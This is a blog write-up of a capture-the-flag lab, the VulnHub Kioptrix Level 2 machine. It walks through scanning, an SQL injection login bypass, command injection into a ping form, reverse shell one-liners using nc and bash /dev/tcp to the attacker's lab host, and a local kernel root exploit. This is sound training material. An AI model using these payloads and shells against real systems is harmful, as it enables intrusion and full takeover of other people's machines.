<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Kioptrix-level-2, CTF, OSCP, Cyber Security, Blockchain">
    <meta name="description" content="Mukhilan Pari Personal Blog">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-179154206-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-179154206-1');
</script>


    <title>Kioptrix-level-2 | Mukhilan</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>
	<script data-ad-client="ca-pub-4717924901422002" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Mukhilan" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Mukhilan</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/resume/mukhilan.pdf" class="waves-effect waves-light">
      
      <i class="fas fa-book" style="zoom: 0.6;"></i>
      
      <span>Resume</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>List</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/privacy-policy">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Privacy-policy</span>
        </a>
      </li>
      
      <li>
        <a href="/disclaimer">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Disclaimer</span>
        </a>
      </li>
      
      <li>
        <a href="/contact">
          
          <i class="fas fa-comments" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Contact</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Mukhilan</div>
        <div class="logo-desc">
            
            Mukhilan Pari Personal Blog
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/resume/mukhilan.pdf" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-book"></i>
			
			Resume
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			List
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/privacy-policy " style="margin-left:75px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Privacy-policy</span>
                  </a>
                </li>
              
                <li>

                  <a href="/disclaimer " style="margin-left:75px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Disclaimer</span>
                  </a>
                </li>
              
                <li>

                  <a href="/contact " style="margin-left:75px">
				  
				   <i class="fa fas fa-comments" style="position: absolute;left:50px" ></i>
			      
		          <span>Contact</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/writeups/kioptrix/Kioptrix.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Kioptrix-level-2</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/OSCP/">
                                <span class="chip bg-color">OSCP</span>
                            </a>
                        
                            <a href="/tags/Notes/">
                                <span class="chip bg-color">Notes</span>
                            </a>
                        
                            <a href="/tags/VulnHub/">
                                <span class="chip bg-color">VulnHub</span>
                            </a>
                        
                            <a href="/tags/Writeups/">
                                <span class="chip bg-color">Writeups</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Writeups/" class="post-category">
                                Writeups
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2021-06-20
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2021-06-20
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    1.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    9 Min
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="KIOPTRIX-LEVEL-1-1-2"><a href="#KIOPTRIX-LEVEL-1-1-2" class="headerlink" title="KIOPTRIX LEVEL 1.1 (#2)"></a>KIOPTRIX LEVEL 1.1 (#2)</h1><p>Kioptrix series consists of 5 vulnerable machines. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul>
<li>-p- –&gt; to scan ports from 1 through 65535</li>
<li>-sV –&gt; Version detection</li>
<li>-sC –&gt; script scan using the default set of scripts =&gt; equivalent to –script=default</li>
<li>-A –&gt; Aggressive scan options</li>
<li>–min-rate 1000 –&gt; 1000 packets per second</li>
<li>–max-retries 5 –&gt; number of times a packet is to be resent on a port to check</li>
</ul>
<pre class=" language-bash"><code class="language-bash">
nmap -p- -sV -sC -A --min-rate 1000 --max-retries 5 192.168.1.10

Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-14 14:47 EDT
Stats: 0:01:53 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Service Scan
Service scan Timing: About 85.71% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 14:49 <span class="token punctuation">(</span>0:00:17 remaining<span class="token punctuation">)</span>
Stats: 0:03:15 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Script Scan
NSE Timing: About 99.89% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 14:50 <span class="token punctuation">(</span>0:00:00 remaining<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.1.10
Host is up <span class="token punctuation">(</span>0.0052s latency<span class="token punctuation">)</span>.
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH 3.9p1 <span class="token punctuation">(</span>protocol 1.99<span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span class="token punctuation">(</span>RSA1<span class="token punctuation">)</span>
<span class="token operator">|</span>   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_sshv1: Server supports SSHv1
80/tcp   <span class="token function">open</span>  http       Apache httpd 2.0.52 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.0.52 <span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
111/tcp  <span class="token function">open</span>  rpcbind    2 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
<span class="token operator">|</span> rpcinfo: 
<span class="token operator">|</span>   program version    port/proto  <span class="token function">service</span>
<span class="token operator">|</span>   100000  2            111/tcp   rpcbind
<span class="token operator">|</span>   100000  2            111/udp   rpcbind
<span class="token operator">|</span>   100024  1           1010/udp   status
<span class="token operator">|</span>_  100024  1           1013/tcp   status
443/tcp  <span class="token function">open</span>  ssl/https?
<span class="token operator">|</span> ssl-cert: Subject: commonName<span class="token operator">=</span>localhost.localdomain/organizationName<span class="token operator">=</span>SomeOrganization/stateOrProvinceName<span class="token operator">=</span>SomeState/countryName<span class="token operator">=</span>--
<span class="token operator">|</span> Not valid before: 2009-10-08T00:10:47
<span class="token operator">|</span>_Not valid after:  2010-10-08T00:10:47
<span class="token operator">|</span>_ssl-date: 2021-06-14T15:40:58+00:00<span class="token punctuation">;</span> -3h09m28s from scanner time.
<span class="token operator">|</span> sslv2: 
<span class="token operator">|</span>   SSLv2 supported
<span class="token operator">|</span>   ciphers: 
<span class="token operator">|</span>     SSL2_RC2_128_CBC_WITH_MD5
<span class="token operator">|</span>     SSL2_RC4_128_EXPORT40_WITH_MD5
<span class="token operator">|</span>     SSL2_DES_64_CBC_WITH_MD5
<span class="token operator">|</span>     SSL2_RC4_64_WITH_MD5
<span class="token operator">|</span>     SSL2_RC4_128_WITH_MD5
<span class="token operator">|</span>     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
<span class="token operator">|</span>_    SSL2_DES_192_EDE3_CBC_WITH_MD5
631/tcp  <span class="token function">open</span>  ipp        CUPS 1.1
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: PUT
<span class="token operator">|</span>_http-server-header: CUPS/1.1
<span class="token operator">|</span>_http-title: 403 Forbidden
1013/tcp <span class="token function">open</span>  status     1 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100024)</span>
3306/tcp <span class="token function">open</span>  mysql?
<span class="token operator">|</span>_mysql-info: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_ssl-cert: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_ssl-date: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_sslv2: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_tls-alpn: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>

Host script results:
<span class="token operator">|</span>_clock-skew: -3h09m28s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 222.78 seconds
</code></pre>
<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>To scan web server running on port 80.</p>
<pre class=" language-bash"><code class="language-bash">
nikto -h 192.168.1.10
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.10
+ Target Hostname:    192.168.1.10
+ Target Port:        80
+ Start Time:         2021-06-16 14:55:32 <span class="token punctuation">(</span>GMT-4<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 <span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span>
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token function">type</span>
+ Apache/2.0.52 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.37<span class="token punctuation">)</span>. Apache 2.2.34 is the EOL <span class="token keyword">for</span> the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="token boolean">false</span> positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?<span class="token operator">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header <span class="token string">'tcn'</span> found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with <span class="token function">file</span> /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
+ OSVDB-3233: /icons/README: Apache default <span class="token function">file</span> found.
+ 8725 requests: 1 error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and 17 item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote host
+ End Time:           2021-06-16 14:56:17 <span class="token punctuation">(</span>GMT-4<span class="token punctuation">)</span> <span class="token punctuation">(</span>45 seconds<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ 1 host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested
</code></pre>
<h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><p>Web servers,</p>
<p>port 443 and 80:<br><img src="/medias/writeups/kioptrix/k2-enum1.png" alt="443 &amp; 80"></p>
<p>port 631:<br><img src="/medias/writeups/kioptrix/k2-enum2.png" alt="613"></p>
<p>Mysql,</p>
<p><img src="/medias/writeups/kioptrix/k2-enum3.png" alt="3306"></p>
<h2 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h2><p>Login page found in the port 80, basic SQL injection worked to by pass the login.</p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>Payload in username and password field:  <code>' or 1=1 --</code></p>
<p><img src="/medias/writeups/kioptrix/k2-webs1.png" alt="payload login page"></p>
<p>Bypassed home page,<br><img src="/medias/writeups/kioptrix/k2-webs2.png" alt="Bypassed home page"></p>
<h3 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h3><p>127.1 is 127.0.0.1, will open a new page <code>/pingit.php</code> and provide output for that IP.</p>
<p>To concatenate bash commands, <code>;</code> , <code>&amp;&amp;</code> can be used.</p>
<p>Source code of the index and pingit page,</p>
<p>From this, database used is <code>webapp</code>.</p>
<p><img src="/medias/writeups/kioptrix/k2-cmdinj3.png" alt="payload"></p>
<pre><code>127.1 &amp;&amp; ls &amp;&amp; cat index.php &amp;&amp; cat pingit.php

PING 127.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.000 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.025 ms

--- 127.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2009ms
rtt min/avg/max/mdev = 0.000/0.019/0.034/0.015 ms, pipe 2
index.php
pingit.php
";
    mysql_select_db("webapp");

    if ($_POST['uname'] != ""){
        $username = $_POST['uname'];
        $password = $_POST['psw'];
        $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
        //print $query."
";
        $result = mysql_query($query);

        $row = mysql_fetch_array($result);
        //print "ID: ".$row['id']."
";
    }

?&gt;

Remote System Administration Login
Username     
Password     


Welcome to the Basic Administrative Web Console
Ping a Machine on the Network:     


';
        echo shell_exec( 'ping -c 3 ' . $target );
        echo '

'; } ?&gt; </code></pre>
<p><code>nc</code> is not in the victim server. so, <code>nc</code> reverse shell didn’t work.</p>
<blockquote>
<p>127.1 &amp;&amp; nc -nv 192.168.1.6 4444 -e /bin/sh</p>
</blockquote>
<p><img src="/medias/writeups/kioptrix/k2-cmdinj1.png" alt="payload"></p>
<p><img src="/medias/writeups/kioptrix/k2-cmdinj2.png" alt="payload output"></p>
<p>Reverse shell cheat sheet : <a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<p>Below reverse shell using bash worked,</p>
<blockquote>
<p>127.1 &amp;&amp; bash -i &gt;&amp; /dev/tcp/192.168.1.6/4444 0&gt;&amp;1</p>
</blockquote>
<pre class=" language-bash"><code class="language-bash">nc -nvlp 4444                                                        1 ⨯
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span>192.168.1.6<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.1.10<span class="token punctuation">]</span> 32770
bash: no job control <span class="token keyword">in</span> this shell
bash-3.00$ <span class="token function">whoami</span>
apache
bash-3.00$ <span class="token function">uname</span> -a
Linux kioptrix.level2 2.6.9-55.EL <span class="token comment" spellcheck="true">#1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux</span>
bash-3.00$ <span class="token function">id</span>
uid<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> gid<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> groups<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span>
bash-3.00$ <span class="token function">cat</span> /etc/*-release    
CentOS release 4.5 <span class="token punctuation">(</span>Final<span class="token punctuation">)</span>
bash-3.00$ 
</code></pre>
<p>Got Normal User(apache) shell.</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Linpeas"><a href="#Linpeas" class="headerlink" title="Linpeas"></a>Linpeas</h3><p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a> can be used to enumerate,</p>
<p>Server created in host,</p>
<blockquote>
<p>sudo python -m SimpleHTTPServer 80</p>
</blockquote>
<p>Only <code>/tmp</code> directory has write access, downloaded linpeas file in victim using wget. </p>
<blockquote>
<p>wget 192.168.1.6/linpeas.sh</p>
</blockquote>
<p>By executing linpeas, operative system output with linux version <code>2.6.9</code> as red which needs attention. </p>
<pre class=" language-bash"><code class="language-bash">Linux version 2.6.9-55.EL <span class="token punctuation">(</span>mockbuild@builder6.centos.org<span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version 3.4.6 20060404 <span class="token punctuation">(</span>Red Hat 3.4.6-8<span class="token punctuation">))</span> <span class="token comment" spellcheck="true">#1 Wed May 2 13:52:16 EDT 2007</span>
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.5 <span class="token punctuation">(</span>Final<span class="token punctuation">)</span>
Release:        4.5
Codename:       Final
</code></pre>
<h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><pre class=" language-bash"><code class="language-bash">$ searchsploit linux 2.6.9 centos
------------------------------------------- ---------------------------------
 Exploit Title                             <span class="token operator">|</span>  Path
------------------------------------------- ---------------------------------
Linux Kernel 2.6 <span class="token operator">&lt;</span> 2.6.19 <span class="token punctuation">(</span>White Box 4 / C <span class="token operator">|</span> linux_x86/local/9542.c
------------------------------------------- ---------------------------------
Shellcodes: No Results</code></pre>
<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>Downloaded <code>9542.c</code> file from host.</p>
<pre class=" language-bash"><code class="language-bash">bash-3.00$ gcc 9542.c -o 9542 
9542.c:109:28: warning: no newline at end of <span class="token function">file</span>
bash-3.00$ ./9542       
sh: no job control <span class="token keyword">in</span> this shell
sh-3.00<span class="token comment" spellcheck="true"># id</span>
uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span>
sh-3.00<span class="token comment" spellcheck="true"># </span></code></pre>
<p>Got root shell.</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a></p>
<p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Mukhilan</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://mukhilan.com/Writeups/Kioptrix-level-2/">http://mukhilan.com/Writeups/Kioptrix-level-2/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Mukhilan</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/OSCP/">
                                    <span class="chip bg-color">OSCP</span>
                                </a>
                            
                                <a href="/tags/Notes/">
                                    <span class="chip bg-color">Notes</span>
                                </a>
                            
                                <a href="/tags/VulnHub/">
                                    <span class="chip bg-color">VulnHub</span>
                                </a>
                            
                                <a href="/tags/Writeups/">
                                    <span class="chip bg-color">Writeups</span>
                                </a>
                            
                        </div>
                    
                </div>
